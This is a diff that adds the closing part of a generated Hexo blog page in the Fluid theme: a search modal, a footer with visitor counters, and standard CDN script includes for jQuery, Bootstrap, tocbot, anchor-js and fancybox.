+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/TSY244?tab=repositories" target="_blank" rel="nofollow noopener"><span>github</span></a> <i class="iconfont icon-love"></i> <a href="https://august244.github.io/" target="_blank" rel="nofollow noopener"><span>随笔</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        Views: 
+        <span id="busuanzi_value_site_pv"></span>
+        
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        Visitors: 
+        <span id="busuanzi_value_site_uv"></span>
+        
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
